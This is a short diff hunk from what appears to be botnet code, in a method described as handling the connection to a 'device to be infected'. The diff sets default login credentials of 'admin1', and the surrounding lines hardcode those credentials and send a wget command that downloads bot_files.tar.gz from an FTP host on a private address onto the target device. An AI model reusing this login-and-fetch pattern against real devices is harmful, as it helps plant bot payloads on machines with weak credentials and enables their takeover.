@@ -67,7 +67,7 @@ class servers:
         ServerSocket.close()
 
     # Handles connection to device to be infected
-    def device_connect(self, ip='127.0.0.1', user='', password=''):
+    def device_connect(self, ip='127.0.0.1', user='admin1', password='admin1'):
         username = "admin1\n"
         password = "admin1\n"
         command1 = b"wget -m ftp://admin1:admin1@192.168.100.12/bot_files.tar.gz -P /home/admin1\n"
